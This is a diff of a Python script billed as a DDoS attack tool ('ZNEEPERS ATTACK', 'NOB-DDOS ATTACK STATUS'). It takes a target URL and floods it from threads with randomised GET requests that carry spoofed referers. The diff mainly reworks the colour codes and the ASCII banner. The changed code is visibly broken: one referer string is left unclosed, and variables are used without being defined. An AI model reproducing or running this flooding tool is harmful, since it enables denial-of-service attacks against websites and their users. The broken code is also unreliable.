@@ -3,23 +3,36 @@ import requests
 import threading
 import random
 
-B = '\033[1m'
-N = '\033[31m'
-N = '\033[0m'
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    ZA1 = '\033[31m'
+    ZA2 = '\033[32m'
+    ZA3 = '\033[33m'
+    FAIL = '\033[91m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    ZH = '\033[97m'
+
 
 if os.name == 'nt':
     os.system("cls")
 else:
     os.system("clear")
 print(" ")                                  
-print("\033[31m                                  ©©  \033[0m")
-print("\033[31m                                  ©©  \033[0m")                 
-print("\033[31m                                  ©©  \033[0m")                 
-print("\033[31m     ®®  ®®      ®®©      ®©©     ©© ©®       \033[0m")             
-print("\033[31m     ®®®   ®®  ®®   ®®  ©©   ©©   ©©   ©©    \033[0m")            
-print("\033[1m     ®®    ®®  ®®   ®®  ©©   ©©   ©©    ©©   \033[0m")            
-print("\033[1m     ®®    ®®  ®®   ®®  ©©   ©©   ©©   ©©    \033[0m")            
-print("\033[1m     ®®    ®®    ®®®      ©©©     ©©©©      \033[0m")             
+print("\033[31m  ©©      ©     ©© ©    © © © ©©         \033[0m")
+print("\033[31m  ©© ©    ©   ©©     ©       ©©                  \033[0m")                 
+print("\033[31m  ©©  ©   ©   ©©     ©      ©©                        \033[0m")                 
+print("\033[31m  ©©   ©  ©   ©©     ©     ©©                 \033[0m")             
+print("\033[31m  ©©    © ©   ©©     ©    ©©               \033[0m")            
+print("\033[1m   ©©      ©     ©© ©     ©© © © ©            \033[0m")            
+print("\033[1m   ••      •     •• •     ••   •               \033[0m")            
+print("\033[1m    •             •        • •                  \033[0m")             
 print("\033[33m  ______________________________________By: Za'99__ \033[0m")     
 print("\033[1m [[  Z  N  E  E  P  E  R  S    A  T  T  A  C  K   ]] \033[0m")    
 print("\033[33m [[                                               ]] \033[0m")   
@@ -32,6 +45,7 @@ url = input("URL:  ").strip()
 count = 0
 headers = []
 referer = [
+    "https://github.com
     "https://instagram.com/",
     "https://facebook.com/",
     "https://alibaba.com/",
@@ -71,7 +85,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print ("\033[33m{0} Birruh Biddam Nafdika yaa AQSHA <====> Sent attack Status\033[0m".format(count))
+                print ("\033[33m[\033[97m+\033[92m]\033[92mSENDING MASSAGE: " +str(u)+ " \033[32mNOB-DDOS ATTACK STATUS " +str()+ " \033[1m" +ip+ "\033[0m" )
             except requests.exceptions.ConnectionError:
                 print ("[Server might be down!]")
                 pass
